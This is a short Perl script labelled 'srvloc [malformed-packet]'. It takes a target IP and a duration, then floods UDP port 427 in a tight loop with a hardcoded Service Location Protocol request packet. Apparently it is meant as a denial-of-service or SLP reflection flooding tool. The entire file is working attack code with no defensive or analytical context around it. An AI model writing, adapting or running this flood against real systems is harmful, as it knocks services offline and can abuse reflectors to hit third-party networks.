#!/usr/bin/perl
# srvloc [malformed-packet]
use Socket;
use strict;
my ($ip,$time,$port,$config) = @ARGV;
my ($iaddr,$endtime,$psize,$pport,$size);
$size = "65507";
$psize = "65507";
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
for (;time() <= $endtime;) { #the line underthis is the srcloc hexadeciemal
send(flood, "\x02\x01\x00\x006 \x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07default\x00\x00\x00\x00", 0, pack_sockaddr_in("427", $iaddr));}